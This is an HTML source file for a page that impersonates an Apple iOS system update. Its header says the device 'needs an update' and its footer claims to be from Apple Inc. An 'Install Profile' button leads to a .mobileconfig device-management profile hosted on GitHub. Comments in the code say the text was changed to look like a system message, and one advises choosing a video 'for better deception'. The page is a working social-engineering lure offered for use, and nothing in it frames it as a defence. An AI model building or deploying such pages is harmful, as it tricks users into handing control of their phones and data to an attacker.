<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>iOS System Update</title> <!-- Changed title -->
  <style>
    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0f0f0f;
      color: #e8e8e8;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
    }

    header {
      text-align: center;
      margin-bottom: 32px;
    }

    header h1 {
      font-size: 1.8rem; /* Slightly smaller for mobile */
      font-weight: 700;
      letter-spacing: -0.5px;
    }

    header p {
      margin-top: 8px;
      color: #aaa;
      font-size: 1rem;
    }

    .video-container {
      width: 100%;
      max-width: 600px; /* Narrower for better mobile focus */
      background: #1a1a1a;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
    }

    /* YouTube / iframe embed */
    .video-wrapper {
      position: relative;
      padding-top: 56.25%; /* 16:9 aspect ratio */
      width: 100%;
    }

    .video-wrapper iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
    }

    .video-info {
      padding: 20px 24px;
      text-align: center; /* Center align text for impact */
    }

    .video-info h2 {
      font-size: 1.25rem;
      font-weight: 600;
      margin-bottom: 8px;
    }

    .video-info p {
      color: #aaa;
      font-size: 0.9rem;
      line-height: 1.4;
    }

    /* NEW: The MDM Install Button */
    .install-btn {
      display: block;
      width: 90%;
      max-width: 300px;
      margin: 25px auto;
      padding: 16px 24px;
      background-color: #007AFF; /* Apple Blue */
      color: white;
      font-size: 1.1rem;
      font-weight: 600;
      text-align: center;
      text-decoration: none;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3);
      transition: transform 0.2s, background-color 0.2s;
    }

    .install-btn:hover {
      background-color: #0063d1;
      transform: scale(1.02);
    }

    .install-btn:active {
      transform: scale(0.98);
    }

    footer {
      margin-top: 40px;
      color: #555;
      font-size: 0.8rem;
    }
  </style>
</head>
<body>

  <header>
    <!-- Changed to look like a system message -->
    <h1>Configuration Required</h1>
    <p>Your device needs an update to continue.</p>
  </header>

  <div class="video-container">
    <div class="video-wrapper">

      <!-- 
        OPTION 1: YouTube Embed 
        Replace 'dQw4w9WgXcQ' with your video ID.
        Use a generic tech or Apple-related video for better deception.
      -->
      <iframe
        src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1" 
        title="System Update Video"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
        allowfullscreen
      ></iframe>

    </div>

    <div class="video-info">
      <h2>iOS System Profile</h2>
      <p>Tap below to install the configuration profile.</p>
      
      <!-- 
        NEW: THE TRIGGER BUTTON 
        Replace 'YOUR_LINK_HERE' with your GitHub Raw link to .mobileconfig
      -->
      <a href="https://raw.githubusercontent.com/AbdullahE-7124/mdm-test/main/profile.mobileconfig" class="install-btn">
        Install Profile
      </a>
    </div>
  </div>

  <footer>Apple Inc. • iOS 17.0+</footer>

</body>
</html>
